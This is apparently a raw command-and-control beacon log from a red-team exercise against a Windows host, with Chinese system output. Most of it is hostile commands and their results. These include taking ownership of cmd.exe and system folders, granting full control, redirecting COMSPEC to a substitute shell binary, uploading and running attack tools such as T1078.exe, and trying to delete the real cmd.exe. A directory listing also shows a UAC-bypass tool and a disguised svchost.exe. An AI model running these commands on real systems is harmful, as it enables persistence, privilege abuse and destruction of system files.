02/03 15:10:53 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 3120; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 15:10:55 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:10:55 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:10:55 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:10:55 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:10:55 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 15:10:55 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd_back.exe
02/03 15:10:55 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 15:11:44 [checkin] host called home, sent: 554 bytes
02/03 15:11:44 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:11:44 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:11:44 [output]
received output:
已复制         1 个文件。


02/03 15:11:44 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:11:44 [output]
received output:
发生系统错误 1379。

指定的本地组已存在。



02/03 15:11:44 [output]
received output:
删除文件 - C:\Windows\System32\cmd_back.exe


02/03 15:11:44 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:23:29 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:23:29 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:23:29 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:23:29 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:23:29 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:23:29 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:23:29 [task] cd c:\RedTeam\
02/03 15:23:29 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1078.exe as T1078.exe
02/03 15:23:29 [indicator] file: 4ad65d936fc82fcca557ae88f2940cb4 30720 bytes T1078.exe
02/03 15:23:29 [task] Tasked beacon to run: C:\RedTeam\T1078.exe
02/03 15:23:29 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 15:23:29 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd_back.exe
02/03 15:23:45 [checkin] host called home, sent: 31384 bytes
02/03 15:23:46 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:23:46 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:23:46 [output]
received output:
已复制         1 个文件。


02/03 15:23:46 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:23:46 [output]
received output:
命令成功完成。



02/03 15:23:46 [output]
received output:
'c:\Windows\System32\cmd_back.exe' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/03 15:23:46 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:23:46 [output]
received output:
删除文件 - C:\Windows\System32\cmd_back.exe


02/03 15:24:58 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:24:58 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:24:58 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:24:58 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:24:58 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:24:58 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:24:58 [task] cd c:\RedTeam\
02/03 15:24:58 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1078.exe as T1078.exe
02/03 15:24:58 [indicator] file: 655a5cca97a70a11e15f071c45722a42 30720 bytes T1078.exe
02/03 15:24:58 [task] Tasked beacon to run: C:\RedTeam\T1078.exe
02/03 15:24:58 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 15:24:58 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd_back.exe
02/03 15:25:46 [checkin] host called home, sent: 31384 bytes
02/03 15:25:47 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:25:47 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:25:47 [output]
received output:
已复制         1 个文件。


02/03 15:25:47 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:25:47 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 15:25:47 [output]
received output:
命令成功完成。



02/03 15:25:47 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:25:47 [output]
received output:
删除文件 - C:\Windows\System32\cmd_back.exe


02/03 15:26:20 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:26:20 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:26:20 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:26:20 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:26:20 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:26:20 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:26:20 [task] cd c:\RedTeam\
02/03 15:26:20 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1078.exe as T1078.exe
02/03 15:26:20 [indicator] file: 655a5cca97a70a11e15f071c45722a42 30720 bytes T1078.exe
02/03 15:26:20 [task] Tasked beacon to run: C:\RedTeam\T1078.exe
02/03 15:26:20 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 15:26:20 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd_back.exe
02/03 15:26:47 [checkin] host called home, sent: 31384 bytes
02/03 15:26:48 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:26:48 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:26:48 [output]
received output:
已复制         1 个文件。


02/03 15:26:48 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:26:48 [output]
received output:
命令成功完成。



02/03 15:26:48 [output]
received output:
命令成功完成。



02/03 15:26:48 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:26:48 [output]
received output:
删除文件 - C:\Windows\System32\cmd_back.exe


02/03 15:31:18 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:31:18 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:31:18 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:31:18 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:31:18 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:31:18 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:31:18 [task] cd c:\RedTeam\
02/03 15:31:18 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1078.exe as T1078.exe
02/03 15:31:18 [indicator] file: 655a5cca97a70a11e15f071c45722a42 30720 bytes T1078.exe
02/03 15:31:18 [task] Tasked beacon to run: C:\RedTeam\T1078.exe
02/03 15:31:48 [checkin] host called home, sent: 31233 bytes
02/03 15:31:49 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:31:49 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:31:49 [output]
received output:
已复制         1 个文件。


02/03 15:31:49 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:31:49 [output]
received output:
命令成功完成。



02/03 15:31:49 [output]
received output:
命令成功完成。



02/03 15:34:35 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:34:35 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:34:35 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:34:35 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:34:35 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:34:35 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:34:35 [task] cd c:\RedTeam\
02/03 15:34:35 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1078.exe as T1078.exe
02/03 15:34:35 [indicator] file: a899a3eeb66f92f637b91dedcdf534b5 30720 bytes T1078.exe
02/03 15:34:35 [task] Tasked beacon to run: C:\RedTeam\T1078.exe
02/03 15:34:49 [checkin] host called home, sent: 31233 bytes
02/03 15:34:49 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:34:49 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:34:49 [output]
received output:
已复制         1 个文件。


02/03 15:34:49 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:34:49 [output]
received output:
命令成功完成。



02/03 15:34:49 [output]
received output:
'cmd_back' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/03 15:42:17 [input] <neo> copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 15:42:17 [error] Unknown command: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 15:42:23 [input] <neo> shell copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 15:42:23 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 15:42:49 [checkin] host called home, sent: 83 bytes
02/03 15:42:49 [output]
received output:
系统找不到指定的文件。


02/03 15:43:17 [input] <neo> bcd c:\redteam
02/03 15:43:17 [error] Unknown command: bcd c:\redteam
02/03 15:43:23 [input] <neo> cd c:\redteam
02/03 15:43:23 [task] cd c:\redteam
02/03 15:43:30 [input] <neo> shell dir
02/03 15:43:30 [task] Tasked beacon to run: dir
02/03 15:43:49 [checkin] host called home, sent: 52 bytes
02/03 15:43:49 [output]
received output:
 驱动器 C 中的卷没有标签。
 卷的序列号是 268E-8911

 c:\RedTeam 的目录

2021/02/03  15:23    <DIR>          .
2021/02/03  15:23    <DIR>          ..
2021/02/03  09:59             4,386 1.txt
2021/01/27  10:22            77,312 127PortExchange.exe
2021/02/03  09:57           131,072 a.etl
2021/02/03  11:06           345,088 cmd.exe
2021/02/03  10:46           473,600 powershell.exe
2019/12/17  16:20           613,832 Rar.exe
2021/01/27  10:24            81,408 redteam.dll
2021/01/27  10:21           169,472 svchost.exe
2021/01/29  16:21            36,864 T1015.exe
2021/02/02  18:41            29,696 T1036.exe
2021/02/03  15:34            30,720 T1078.exe
2021/01/28  09:48             8,586 test.doc
2021/01/27  10:40           160,256 uacbypass64.exe
2021/02/02  17:06           113,488 vcruntime140d.dll
2021/02/03  10:33            31,744 win32UIDEMO.JPG
              15 个文件      2,307,524 字节
               2 个目录 32,556,941,312 可用字节


02/03 15:44:09 [input] <neo> shell copy C:\RedTeam\cmd.exe C:\Windows\System32\ /y
02/03 15:44:09 [task] Tasked beacon to run: copy C:\RedTeam\cmd.exe C:\Windows\System32\ /y
02/03 15:44:49 [checkin] host called home, sent: 78 bytes
02/03 15:44:50 [output]
received output:
另一个程序正在使用此文件，进程无法访问。
已复制         0 个文件。


02/03 15:45:18 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:45:18 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:45:18 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:45:18 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:45:18 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:45:18 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:45:18 [task] cd c:\RedTeam\
02/03 15:45:18 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1078.exe as T1078.exe
02/03 15:45:18 [indicator] file: a899a3eeb66f92f637b91dedcdf534b5 30720 bytes T1078.exe
02/03 15:45:18 [task] Tasked beacon to run: C:\RedTeam\T1078.exe
02/03 15:45:50 [checkin] host called home, sent: 31233 bytes
02/03 15:45:50 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:45:50 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:45:50 [output]
received output:
已复制         1 个文件。


02/03 15:45:50 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:45:50 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 15:45:50 [output]
received output:
'cmd_back' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/03 15:46:33 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:46:33 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:46:33 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:46:33 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:46:33 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:46:33 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:46:33 [task] cd c:\RedTeam\
02/03 15:46:33 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1078.exe as T1078.exe
02/03 15:46:33 [indicator] file: a899a3eeb66f92f637b91dedcdf534b5 30720 bytes T1078.exe
02/03 15:46:33 [task] Tasked beacon to run: C:\RedTeam\T1078.exe
02/03 15:46:50 [checkin] host called home, sent: 31233 bytes
02/03 15:46:51 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:46:51 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:46:51 [output]
received output:
已复制         1 个文件。


02/03 15:46:51 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:46:51 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 15:46:51 [output]
received output:
'cmd_back' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/03 15:47:22 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:47:22 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:47:23 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:47:23 [task] cd c:\RedTeam\
02/03 15:47:23 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 15:47:23 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 15:47:23 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 15:47:23 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:47:23 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:47:23 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:47:50 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:47:50 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:47:50 [task] Tasked beacon to make directory c:\RedTeam\
02/03 15:47:50 [task] cd c:\RedTeam\
02/03 15:47:51 [checkin] host called home, sent: 345796 bytes
02/03 15:47:51 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 15:47:51 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 15:47:51 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 15:47:51 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:47:51 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 15:47:51 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 15:47:51 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:47:51 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:47:51 [output]
received output:
已复制         1 个文件。


02/03 15:47:51 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:47:51 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 15:47:51 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 15:47:51 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 15:47:51 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 15:48:51 [checkin] host called home, sent: 345390 bytes
02/03 15:48:52 [output]
received output:
已复制         1 个文件。


02/03 15:48:52 [output]
received output:

成功: 指定的值已得到保存。


02/03 15:48:52 [output]
received output:
发生系统错误 1376。

指定的本地组不存在。



02/03 15:48:52 [output]
received output:
命令成功完成。



02/03 15:52:32 [input] <neo> shell net localgroup tests3 /add
02/03 15:52:32 [task] Tasked beacon to run: net localgroup tests3 /add
02/03 15:52:52 [checkin] host called home, sent: 57 bytes
02/03 15:52:52 [output]
received output:
命令成功完成。



02/03 16:08:14 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:08:14 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:08:15 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:08:15 [task] cd c:\RedTeam\
02/03 16:08:15 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:08:15 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:08:15 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:08:15 [task] cd c:\RedTeam\
02/03 16:08:15 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 16:08:15 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:08:15 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd.exe
02/03 16:08:15 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:08:15 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:08:52 [checkin] host called home, sent: 345699 bytes
02/03 16:08:53 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:08:53 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:08:53 [output]
received output:
已复制         1 个文件。


02/03 16:08:53 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:08:53 [output]
received output:
C:\Windows\System32\cmd.exe
拒绝访问。


02/03 16:08:53 [output]
received output:
命令成功完成。



02/03 16:08:53 [output]
received output:
命令成功完成。



02/03 16:16:37 [task] Tasked beacon to run: takeown /F "C:\Windows\System32" /A
02/03 16:16:37 [task] Tasked beacon to run: icacls "C:\Windows\System32" /grant Administrators:F
02/03 16:16:38 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:16:38 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:16:38 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:16:38 [task] cd c:\RedTeam\
02/03 16:16:38 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:16:38 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:16:38 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:16:38 [task] cd c:\RedTeam\
02/03 16:16:38 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 16:16:38 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:16:38 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd.exe
02/03 16:16:38 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:16:38 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:16:53 [checkin] host called home, sent: 345848 bytes
02/03 16:16:54 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32" 现在由管理员组所有。


02/03 16:16:54 [output]
received output:
已处理的文件: C:\Windows\System32
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:16:54 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:16:54 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:16:54 [output]
received output:
已复制         1 个文件。


02/03 16:16:54 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:16:54 [output]
received output:
C:\Windows\System32\cmd.exe
拒绝访问。


02/03 16:16:54 [output]
received output:
命令成功完成。



02/03 16:16:54 [output]
received output:
命令成功完成。



02/03 16:19:09 [task] Tasked beacon to run: takeown /F "C:\Windows" /A
02/03 16:19:10 [task] Tasked beacon to run: icacls "C:\Windows" /grant Administrators:F
02/03 16:19:10 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:19:10 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:19:10 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:19:10 [task] cd c:\RedTeam\
02/03 16:19:11 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:19:11 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:19:11 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:19:11 [task] cd c:\RedTeam\
02/03 16:19:11 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 16:19:11 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:19:11 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd.exe
02/03 16:19:11 [task] Tasked beacon to run: Net Localgroup Tests /del
02/03 16:19:11 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 16:19:54 [checkin] host called home, sent: 345830 bytes
02/03 16:20:02 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows" 现在由管理员组所有。


02/03 16:20:02 [output]
received output:
已处理的文件: C:\Windows
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:20:02 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:20:02 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:20:02 [output]
received output:
已复制         1 个文件。


02/03 16:20:02 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:20:02 [output]
received output:
C:\Windows\System32\cmd.exe
拒绝访问。


02/03 16:20:02 [output]
received output:
命令成功完成。



02/03 16:20:02 [output]
received output:
命令成功完成。



02/03 16:23:14 [task] Tasked beacon to run: takeown /F "C:\Windows" /A
02/03 16:23:14 [task] Tasked beacon to run: icacls "C:\Windows" /grant Administrators:F
02/03 16:23:14 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 16:23:15 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 16:23:15 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:23:15 [task] cd c:\RedTeam\
02/03 16:23:15 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\cmd_back.exe as cmd_back.exe
02/03 16:23:15 [indicator] file: 5746bd7e255dd6a8afa06f7c42c1ba41 345088 bytes cmd_back.exe
02/03 16:23:15 [task] Tasked beacon to make directory c:\RedTeam\
02/03 16:23:15 [task] cd c:\RedTeam\
02/03 16:23:15 [task] Tasked beacon to run: copy C:\RedTeam\cmd_back.exe C:\Windows\System32\ /y
02/03 16:23:15 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:23:15 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 16:24:02 [checkin] host called home, sent: 345733 bytes
02/03 16:24:11 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows" 现在由管理员组所有。


02/03 16:24:11 [output]
received output:
已处理的文件: C:\Windows
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:24:11 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 16:24:11 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 16:24:11 [output]
received output:
已复制         1 个文件。


02/03 16:24:11 [output]
received output:

成功: 指定的值已得到保存。


02/03 16:24:11 [output]
received output:

成功: 指定的值已得到保存。


